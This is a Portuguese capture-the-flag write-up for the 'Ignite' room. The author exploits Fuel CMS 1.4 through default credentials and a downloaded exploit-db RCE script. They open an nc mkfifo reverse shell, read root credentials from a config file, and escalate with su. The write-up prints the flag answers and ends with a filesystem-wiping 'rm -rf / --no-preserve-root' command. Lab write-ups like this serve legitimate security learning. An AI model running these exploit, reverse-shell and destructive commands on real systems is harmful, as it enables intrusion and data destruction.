CTF IGNITE

Ao inicar o desafio dei um nmap 

    nmap -A -sV IP 

Encontrei apenas a porta 80 

No servidor apache no html tinha informando o diretorio a versao do fuel cms, o username e senha do admin 

    version 1.4
    /fuel
    username: admin
    password: admin

Dei um gobuster mas nao encontrei nada apenas uma index.php, assim ja pensando que teria que executar um script em php 

Ao logar no painel admin tinha algumas opcoes para upar arquivos php ou qualquer outro, tinha como criar usuarios, enviar imagens etc..

Entretando nao consegui executar nenhum script que criase uma shell reversa para mim, entao pensei estar no caminho errado

Ao procurar por algum erro da versao do fuel cms no "exploit-db", encontrei uma falha RCE dessa versao

Entao eu baixei o arquivo para o meu kali 

    wget https://www.exploit-db.com/raw/50477
    python3 50477 -u http://IP

Executando o script tinha que informar apenas um parametro que era o ip que seria atacado... 

Abria uma shell que nao tinha acesso a nada... 
Assim teria que tentar executar outra reverse shell nessa shell que abri 

Bom, a partir dai eu nao sabia qual shell executar entao eu tentei em python.. em bash e fui seguindo ate alguma dar certo ate que consegui usando a nc mkfifo

Script

    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc IP(tryhackme) 1333 >/tmp/f

NetCat

    nc -lvnp 1333

Assim conseguindo acesso ao usuario www-data e tendo acesso a primeira flag do desafio "user.txt" 

    cd home
    www-data
    cat flag.txt
    6470e394cbf6dab6a91682cc8585059b

Apos conseguir acesso a primeira flag do desafio tinha que ir atras do root 
Procurando no sistema encontrei a database da aplicacao dentro do diretorio

    /var/www/html/application/config/database.php

Dentro da database.php tinha o nome e senha do root

    username: root
    password: mememe

Ao tentar acessar o root pelo su ele pedia que fosse em um terminal entao executei um script em python que me permite executar o su

    touch script.py
    echo 'import pty;pty.spawn("/bin/sh")' >> script.py
    python script.py

Assim...

    su root
    pass "mememe"

Dentro da pasta root

    cd root
    cat root.txt
    b9bbcb33e11b80be759c4e844862482d

Finalizando..

    touch dannydev19.txt
    rm -rfv / --no-preserve-root

FLAGS

    FLAG 1: 6470e394cbf6dab6a91682cc8585059b
    FLAG 2: b9bbcb33e11b80be759c4e844862482d
   
![image](https://user-images.githubusercontent.com/86691253/184378722-a10a3cf0-5ff0-49fa-85e8-ca9e5d934661.png)
